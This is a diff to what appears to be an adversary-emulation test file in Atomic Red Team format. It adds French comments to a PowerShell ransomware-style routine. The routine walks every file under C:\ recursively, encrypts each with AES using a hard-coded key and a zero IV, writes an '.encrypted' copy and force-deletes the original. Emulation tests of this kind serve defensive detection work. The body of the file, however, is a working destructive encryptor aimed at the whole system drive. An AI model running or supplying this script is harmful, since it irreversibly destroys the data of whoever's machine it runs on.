@@ -9,24 +9,38 @@ atomic_tests:
     name: powershell
     command: |
       $targetDirectory = "C:\\"
-      $key = "MySecretKey123"
+      $key = "MySecretKey123" # Clé de chiffrement (peut être modifiée)
+
       function Encrypt-File {
           param (
               [string]$filePath,
               [string]$key
           )
           try {
+              # Lire le contenu du fichier
               $fileContent = Get-Content -Path $filePath -Raw -Encoding Byte
+
+              # Configurer l'algorithme de chiffrement AES
               $aes = New-Object System.Security.Cryptography.AesManaged
               $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
-              $aes.IV = New-Object Byte[]($aes.BlockSize / 8) # IV vide
+              $aes.IV = New-Object Byte[]($aes.BlockSize / 8) # IV vide pour simplicité
               $encryptor = $aes.CreateEncryptor()
+
+              # Chiffrer les données
               $encryptedData = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
+
+              # Écrire les données chiffrées dans un nouveau fichier
               Set-Content -Path ($filePath + ".encrypted") -Value $encryptedData -Encoding Byte
-              Remove-Item -Path $filePath -Force  # Supprimer le fichier original
+
+              # Supprimer le fichier original
+              Remove-Item -Path $filePath -Force
               Write-Host "Fichier chiffré et supprimé : $filePath"
           } catch {
               Write-Host "Erreur lors du chiffrement de $filePath : $_"
           }
       }
-      Get-ChildItem -Path $targetDirectory -Recurse -File | ForEach-Object { Encrypt-File -filePath $_.FullName -key $key }
+
+      # Parcourir tous les fichiers dans le répertoire cible
+      Get-ChildItem -Path $targetDirectory -Recurse -File | ForEach-Object {
+          Encrypt-File -filePath $_.FullName -key $key
+      }
